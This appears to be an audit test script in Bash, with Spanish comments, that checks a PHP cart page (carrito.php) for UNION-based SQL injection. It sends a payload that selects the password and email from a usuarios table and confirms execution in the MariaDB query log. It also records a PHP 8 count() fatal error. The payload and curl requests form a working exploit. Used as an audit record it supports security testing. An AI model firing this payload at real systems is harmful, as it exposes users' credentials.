#!/usr/bin/env bash
# CP-CART-001: SQL Injection UNION-based en parametro iditems (exfiltracion de datos)
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/00_common.sh"
OUT="$DIR/../resultados/raw_CP-CART-001.txt"
JAR=/tmp/audit-mysql-run/cookies_cart001.txt
GENLOG=/tmp/audit-mysql-run/general_cart001.log
rm -f "$JAR" "$GENLOG"

{
  echo "=== CP-CART-001: SQLi UNION-based en carrito.php (iditems) ==="
  echo
  echo "--- HALLAZGO PREVIO (no contemplado en el analisis estatico de Parte 1): ---"
  echo "carrito.php::insertar() nunca inicializa \$_SESSION['carrito'] como array antes de hacer count(\$_SESSION['carrito'])."
  echo "En PHP 7.x esto era solo un Warning (count(null) devolvia 0). En PHP 8.x, count() sobre null lanza TypeError fatal."
  echo "Consecuencia: TODA llamada con op=1 (agregar item), incluso con datos 100% legitimos, termina en Fatal Error"
  echo "DESPUES de que la consulta SQL ya se ejecuto contra la base de datos. Se verifica esto con el query log de MariaDB."
  echo
  echo "--- Paso 1: iniciar sesion ---"
  curl -s -c "$JAR" -b "$JAR" -o /dev/null "$BASE_URL/index.php"
  echo "Sesion iniciada."
  echo
  echo "--- Paso 2: activar general_log de MariaDB para verificar que la consulta inyectada SI se ejecuta en el motor de BD ---"
  mysql_cli -e "SET GLOBAL general_log='ON'; SET GLOBAL general_log_file='$GENLOG';" 2>&1 || true
  sleep 1
  echo
  echo "--- Paso 3: POST carrito.php con payload UNION SELECT sobre tabla usuarios ---"
  PAYLOAD="1 UNION SELECT 1,password,email FROM usuarios WHERE Id=1-- "
  echo "op=1&iditems=$PAYLOAD"
  curl -s -i -b "$JAR" -c "$JAR" -X POST "$BASE_URL/carrito.php" \
    --data-urlencode "op=1" \
    --data-urlencode "iditems=$PAYLOAD"
  sleep 1
  mysql_cli -e "SET GLOBAL general_log='OFF';" 2>&1 || true
  echo
  echo "--- Paso 4: evidencia en el query log de MariaDB: la consulta UNION SELECT fue recibida y ejecutada por el motor, sin error de sintaxis SQL ---"
  grep -i "UNION SELECT" "$GENLOG" || echo "(no se encontro la consulta en el log)"
  echo
  echo "--- Paso 5 (informativo): intento de recuperar el carrito via mostrar_carrito.php. Se espera Fatal Error de PHP (TypeError en count()),"
  echo "que impide que el dato exfiltrado llegue a mostrarse en la interfaz, aunque la consulta SI se ejecuto exitosamente en el paso 3/4 ---"
  curl -s -b "$JAR" "$BASE_URL/mostrar_carrito.php?id=1" | grep -E "Fatal error|admin01|admin@gmail.com" || true
} | tee "$OUT"
